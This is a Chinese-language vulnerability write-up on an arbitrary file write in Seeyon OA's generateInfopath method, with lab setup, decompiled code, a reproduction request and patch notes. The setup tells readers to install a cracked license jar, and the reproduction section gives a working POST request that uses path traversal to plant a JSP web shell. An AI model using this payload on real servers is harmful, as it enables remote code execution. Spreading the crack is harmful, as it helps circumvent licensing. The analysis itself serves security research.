## 环境搭建

```
链接：https://pan.baidu.com/s/1d9BgbCkV82WG1TCwXvmMDA?pwd=h7kz 
提取码：h7kz 
```

- （1）安装mysql数据库（针对A8版本）。创建一个新的数据库，字符集设置为UTF-8。如果是A6版本，如 `A6v6.1、A6v6.1sp1、A6v6.1sp2`，默认使用内嵌在安装包中的`postgresql`作为数据库，无需单独安装

- （2）获取安装文件。`Seeyonxxx.zip`（安装包）、`jwycbjnoyees.jar`（破解补丁）

- （3）在安装包中点击要安装版本`.bat`文件，如`/inst/SeeyonA6-1Install_real.bat`

- （4）按照弹出的安装程序确认安装路径、配置数据库等（安装过程需要断网，否则检测到不是最新版无法进行下一步）。如果是A6版本，到数据库配置阶段可以修改`postgres`用户的密码。另外，针对A6版本，`postgresql`安装完成后不会设置`Windows`服务项，重启机器后再次启动会比较麻烦，可使用如下命令注册一个名为`pgsql`的服务项。后续可在`Windows`服务管理里启停`postgresql`服务
```
cd C:\Seeyon\A6V6.1SP2\pgsql9.2.5\bin pg_ctl.exe register -N "pgsql" -D "C:\Seeyon\A6\A6V6.1SP2\pgsql9.2.5\data"
```

- （5）安装最后一步是账号密码设置。A6-A8.0版本默认设置`system`账户的密码。A8.1版本可定义管理员账号、密码、普通用户初始密码、S1 Agent密码。

- （6）安装破解补丁。如果服务已经启动，需要先关闭服务。首先备份安装目录`A6\ApacheJetspeed\webapps\seeyon\WEB-INF\lib`下的`jwycbjnoyees.jar`文件，然后将其替换成补丁文件后重启服务。补丁文件下载（此补丁针对A8.1）：[https://github.com/ax1sX/SecurityList/blob/main/Java_OA/jwycbjnoyees.jar](https://github.com/ax1sX/SecurityList/blob/main/Java_OA/jwycbjnoyees.jar)
  
- （7）服务启动。A6在确保postgresql数据库服务是启动的状态下，点击“致远服务”图标来启动服务。A8是通过agent+server的形式来部署的。所以需要先启动`S1 Agent`，通过双击`Seeyon\A8\S1\start.bat`或点击`SeeyonS1Agent`图标都可以实现。然后再点击“致远服务”图标（等效于`/S1/client/clent.exe`），在其“服务启动配置”中添加Agent。
  
- （8）默认端口是80，可以在“致远服务”的“服务启动配置”中点击Agent的配置选项，对HTTP端口和JVM属性进行更改。想要对致远进行调试，可以在修改`/ApacheJetspeed/bin/startup.bat`文件，添加如下内容。
```
set JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"
```

### 目录结构

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121415737.png)

管理员权限运行 /inst/SeeyonA6-1Install_real.bat

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121418960.png)
按照程序提示一步步安装即可。

### 运行程序

安装成功后的目录结构

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121419459.png)

添加调试代码 `/ApacheJetspeed/bin/startup.bat`

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121433151.png)

配置debug

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121435529.png)



测试调试下断点

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121450500.png)

## generateInfopath 函数

漏洞文件：`\ApacheJetspeed\webapps\seeyon\WEB-INF\lib\seeyon-cap-core\com\seeyon\cap4\form\modules\engin\design\impl\CAP4FormDesignManagerImpl.java`

```java
@Override  
@AjaxAccess  
@CheckRoleAccess(resourceCode={"govdoc_manage"}, roleTypes={OrgConstants.Role_NAME.EdocManagement, OrgConstants.Role_NAME.FormAdmin})  
public Map<String, Object> generateInfopath(Map<String, Object> params) throws BusinessException {  
    List atts;  
    String zipName;  
    String paramName = "files";  
    if (!params.containsKey(paramName)) {  
        throw new BusinessException("没有传入表单视图内容文件，请传入视图内容文件！");  
    }  
    HashMap<String, Object> resultMap = new HashMap<String, Object>();  
    Date date = new Date();  
    String fileId = String.valueOf(date.getTime());  
    String baseFolder = this.fileManager.getNowFolder(true);  
    Long subFolder = UUIDLong.absLongUUID();  
    String rootPath = baseFolder + File.separator + String.valueOf(subFolder) + File.separator;  
    List files = (List)params.get("files");  
    if (null != files && files.size() > 0) {  
        for (Map map : files) {  
            String fileName = (String)map.get("fileName");  
            String fileContent = (String)map.get("fileContent");  
            CapUtil.writeFile((String)rootPath, (String)fileName, (String)fileContent);  
        }  
    }  
    if (Strings.isNotEmpty((String)(zipName = String.valueOf(params.get("name"))))) {  
        zipName = zipName + ".zip";  
    }  
    if (null != (atts = (List)params.get("atts")) && atts.size() > 0) {  
        CtpLocalFile attFile = new CtpLocalFile(rootPath + "attachment" + File.separator);  
        if (!attFile.exists()) {  
            attFile.mkdirs();  
        }  
        try {  
            for (Map map : atts) {  
                Long imgFileId;  
                CtpFile file;  
                String fileUrl = (String)map.get("fileUrl");  
                String createDate = (String)map.get("createDate");  
                String attachmentName = (String)map.get("name");  
                if (Strings.isEmpty((String)attachmentName)) {  
                    attachmentName = UUIDLong.absLongUUID() + "";  
                }  
                if (null == (file = this.fileManager.getFile(imgFileId = Long.valueOf(Long.parseLong(fileUrl)), DateUtil.parse((String)createDate, (String)"yyyy-MM-dd"))) || !file.exists()) continue;  
                CtpFile destination = new CtpFile(rootPath + attachmentName);  
                if (!destination.exists()) {  
                    destination.createNewFile();  
                }  
                GlobalFileUtils.copyCtpFile((CtpFile)file, (CtpFile)destination);  
                LOGGER.info((Object)("\u9644\u4ef6(id:" + fileUrl + " createDate:" + createDate + ") \u4e0d\u5b58\u5728\uff0c\u65e0\u6cd5\u62f7\u8d1d\uff01"));  
            }  
        }  
        catch (Exception e) {  
            LOGGER.error((Object)e.getMessage(), (Throwable)e);  
        }  
    }  
    CtpLocalFile rootFile = new CtpLocalFile(rootPath);  
    String toFileName = rootFile.getParent() + File.separator + fileId;  
    CtpLocalFile toFile = new CtpLocalFile(toFileName);  
    try {  
        ZipUtil.zip((CtpLocalFile)rootFile, (CtpAbstractFile)toFile, (boolean)false);  
        V3XFile v3XFile = this.fileManager.save((CtpAbstractFile)toFile, ApplicationCategoryEnum.global, zipName, DateUtil.currentDate(), Boolean.valueOf(true));  
        resultMap.put("fileId", v3XFile.getId());  
        resultMap.put("createDate", v3XFile.getCreateDate());  
    }  
    catch (Exception e) {  
        LOGGER.error((Object)e.getMessage(), (Throwable)e);  
    }  
    finally {  
        FileUtil.deleteFile((CtpLocalFile)rootFile);  
    }  
    return resultMap;  
}
```

主要实现写入文件的方法 `CapUtil.writeFile((String)rootPath, (String)fileName, (String)fileContent);`

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410112154504.png)

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121453814.png)

跟着进去`writeFile` 方法
## CapUtil.writeFile

文件路径：`\ApacheJetspeed\webapps\seeyon\WEB-INF\lib\seeyon-cap-api.jar!\com\seeyon\cap4\form\util\CapUtil.class`

```java
public static void writeFile(String baseDir, String fileExt, String content) throws BusinessException {  
    CtpLocalFile file = new CtpLocalFile(baseDir);  
    if (!file.exists()) {  
        file.mkdirs();  
    }  
  
    CtpLocalFile destFile = new CtpLocalFile(baseDir, fileExt);  
    OutputStream fout = null;  
    PrintStream writer = null;  
  
    try {  
        fout = new FileOutputStream(destFile);  
        writer = new PrintStream(fout, false, "UTF-8");  
        writer.print(content);  
        writer.flush();  
    } catch (FileNotFoundException var12) {  
        logger.error(var12.getMessage(), var12);  
        throw new BusinessException("写入文件异常，未找到文件：" + var12.getMessage(), var12);  
    } catch (UnsupportedEncodingException var13) {  
        logger.error(var13.getMessage(), var13);  
        throw new BusinessException("写入文件异常，不支持的编码：" + var13.getMessage(), var13);  
    } finally {  
        IOUtils.closeQuietly(writer);  
        IOUtils.closeQuietly(fout);  
    }  
  
}
```

`CtpLocalFile file = new CtpLocalFile(baseDir);`  创建一个目录的对象，并 if 判断 file 目录是否存在，不存在就创建新文件夹。
`CtpLocalFile destFile = new CtpLocalFile(baseDir, fileExt); ` 创建文件对象

```java
fout = new FileOutputStream(destFile);  
writer = new PrintStream(fout, false, "UTF-8");  
writer.print(content);  
writer.flush();  
```
创建一个文件输出流 `fout`，用于向目标文件写入数据。
创建一个 `PrintStream` 对象 `writer`，指定输出流和字符编码为 UTF-8。
使用 `writer.print(content)` 将内容写入文件，并使用 `writer.flush()` 确保所有内容都被写入。

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121456413.png)

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121457092.png)

成功写入文件

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121457308.png)

## 漏洞复现

```java
POST /seeyon/ajax.do?method=ajaxAction&managerName=cap4FormDesignManager HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Length: 331
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: ts=1728653264995; JSESSIONID=EADD9E1D7E239870F85E73935AC9AD34; loginPageURL=; login_locale=zh_CN; avatarImageUrl=5995465946958220283
Host: 192.168.18.129:8085
RequestType: AJAX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0

managerMethod=generateInfopath&arguments={"files":[{"fileName":"../../../../../../ApacheJetspeed/webapps/seeyon/5.jsp","fileContent":"%3c%25%6f%75%74%2e%70%72%69%6e%74%28%6f%72%67%2e%61%70%61%63%68%65%2e%6a%61%73%70%65%72%2e%72%75%6e%74%69%6d%65%2e%50%61%67%65%43%6f%6e%74%65%78%74%49%6d%70%6c%2e%70%72%6f%70%72%69%65%74%61%72%79%45%76%61%6c%75%61%74%65%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%5c%22%63%6f%64%65%5c%22%29%2c%20%53%74%72%69%6e%67%2e%63%6c%61%73%73%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2c%20%6e%75%6c%6c%29%29%3b%25%3e"}]}
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410112155794.png)
![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410112156221.png)


## 补丁

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410112222147.png)

对传入的路径和文件后缀进行过滤

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410112223590.png)

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410112223980.png)

## 参考文章
- https://github.com/ax1sX/SecurityList/blob/main/Java_OA/SeeyonAudit.md
